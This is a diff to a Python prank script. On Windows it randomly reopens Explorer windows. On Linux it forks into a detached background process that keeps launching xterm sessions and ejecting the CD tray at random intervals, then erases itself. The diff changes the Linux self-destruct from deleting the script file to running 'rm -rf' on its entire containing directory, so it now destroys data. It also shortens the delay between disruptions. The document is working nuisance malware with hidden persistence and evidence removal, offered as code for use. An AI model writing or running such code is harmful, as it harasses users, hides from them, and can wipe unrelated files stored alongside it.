@@ -1,32 +1,31 @@
 #!/usr/bin/env python
 #-*- coding: utf-8 -*-
-
-###
-# IMPORTS
-#
-from os         import name     as currentOS
+import os
+from os         import fork
+from os         import name     as cOS
 from os         import path     as p
-from random     import randint
-from subprocess import call
-from sys        import exit
-from time       import sleep
-###
-# SPECIFIC IMPORTS
-#
-if currentOS == 'nt':
-    from os         import system
-else:
-    from os         import fork
-    from os         import setsid
+from os         import setsid
+from os         import system
 
-###
-# FUNCTIONS
-#
-'''
-Check and correct the windows path (replace Example example by "Example example")
-Return string
-'''
+import random
+from random     import choice
+from random     import randint
+
+import subprocess
+from subprocess import call
+
+import time
+from time       import sleep
+
+
+""" Max latency: 2 mn """
+MAX_LATENCY = 2*60 
+
+
 def getWindowsPath():
+    """Check and correct the windows path
+    Return string
+    """
     path  = p.realpath(__file__)
     spath = path.split('\\')
     index = 0
@@ -37,44 +36,43 @@ def getWindowsPath():
             segment = segment[::-1]
             segment+="\""
             spath[index] = segment
-        index+=1
+        index += 1
     return "\\".join(spath)
-'''
-self destroy the file regarding current OS then quit
-'''
+
 def selfDestruction():
-    if currentOS == 'nt':
+    """self destroy the file regarding current OS then quit
+    """
+    if cOS == 'nt':
         selfDestruct = "del " \
                      + getWindowsPath()
         system(selfDestruct)
     else:
-        call(["rm",p.realpath(__file__)])
-    exit(0)
+        call(["rm","-rf", p.dirname(p.abspath(__file__))])
    
-###
-# MAIN
-#
 
-MAX_LATENCY = 5*60  # max latency = 5 minutes
 
 if __name__ == "__main__":
     # Windows
-    if currentOS == 'nt':
+    if cOS == 'nt':
         for i in range(15):
             sleep(randint(0,MAX_LATENCY))
             system("start %windir%\explorer.exe")
         selfDestruction()
         
-    #Linux
+    # Linux
     else:
+        linux_threat = [
+                ["xterm","vim"],
+                ["eject","-t"] ,
+                ["xterm","tree"],
+                ["xterm","sl"]]
         pid = fork()
-        if pid==0:
+        if pid == 0:
             setsid()
             pid = fork()
-            if pid==0:
-                # Now run as a background task
-                while True:
+            if pid == 0: # Now run as a background task
+                while True: # Now polling
                     sleep(randint(0,MAX_LATENCY))
-                    call(["xterm","vim"])
+                    call(choice(linux_threat))
         else:
-            selfDestruction()
+            selfDestruction() # Destroy sources
